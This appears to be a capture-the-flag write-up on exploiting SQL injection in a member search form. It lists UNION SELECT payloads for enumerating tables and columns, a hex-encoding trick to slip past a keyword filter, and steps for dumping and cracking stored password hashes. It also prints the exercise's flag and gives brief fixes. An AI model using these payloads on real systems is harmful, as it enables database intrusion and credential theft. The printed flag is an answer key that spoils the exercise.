
# SQL Injection in search for member

how i found the flag:




## Usage/Examples

```sql
1_ first get the table name :
SQL_injection Membre search :
-- 5 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema = DATABASE() --

2_ then get all its column :
-- 5 union all select 5,(column_name) from Information_schema.columns where table_name=0x7573657273
* Some web applications have basic input filters that look for specific SQL keywords or patterns, such as table names, to prevent SQL injectionm in order to byPass this check we convert table name to hexaDecimal

3_ now we read every table till we got something useful in my case i found it in comments table 
-- 5 union all select 5,(Commentaire) from users  //no hexa here cause MySql consider this command normal not a threat

4_ after reading all comments we found the last comment saying : "Decrypt this password -> then lower all the char. Sh256 on it and it's good !", we need a password to decrypt it, if you readall table columns you`ll noticed that the countersign has some increpted values
-- 5 union all select 5,(countersign) from users

5_ decrypt all the encrypted value with md5

6_ one of them will give you : FortyTwo lower itto fortytwo and encrypt it with Sh256 and you will get the FLAG.
FLAG: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## sources :
* https://chatgpt.com/share/b318a774-8c2d-48f4-b026-4f8fb941c635
* https://md5decrypt.net/en/
* https://emn178.github.io/online-tools/sha256.html

## to resolve the patch:

1_ use an ORM (object relational mapping tool) as it check the query befor it send it to server
2_ filter user input